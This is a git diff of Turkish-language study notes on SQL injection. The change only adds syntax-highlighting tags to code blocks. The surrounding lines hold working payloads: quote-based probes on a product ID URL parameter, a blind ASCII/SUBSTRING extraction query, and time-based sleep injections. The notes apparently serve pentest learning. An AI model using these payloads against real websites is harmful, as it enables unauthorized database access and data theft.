@@ -12,7 +12,7 @@
 * Data insert ederken bile sleep methodunu çalıştırabilirsin. 
 * SQL Injection bulurken kendine bir referans noktası seçersin ve denediğin yöntemlerle bu ilk noktaya dönmeye çalışırsın. Başarırsan zaafiyeti kanıtlamışsın demektir.
 * SQLi tespit etmek için URL kısmında şunları dene: 
-```
+```python
 ..../productid=4'
 	invalid falan verirse
 ..../productid=4''
@@ -150,14 +150,14 @@ SELECT * FROM haberler WHERE id = 1 and ASCII(SUBSTRING((SELECT column_name FROM
 ```
 ## Time Based SQLi
 > Bu şekilde injection yapılabiliyor:
-```
+```SQL
 SELECT * FROM haberler WHERE id = 1 and 1=IF (1=1,1,0)  condition doğruysa 1 dön değilse 0 dön.
 SELECT * FROM haberler WHERE id = 1 and 1=IF (1=1,sleep(5),0)      eğer cevap dönmesi uzun sürerse açığı yakaladın demektir.
 	Sonrasında SUBSTRING ve ASCII'den yürü.
 ```
 ## Out-of-Band SQLi
 - Örnek python kodu:
-```
+```python
 id = request.get('id')
 
 rabbitmq.pushTask('report_generate',id)
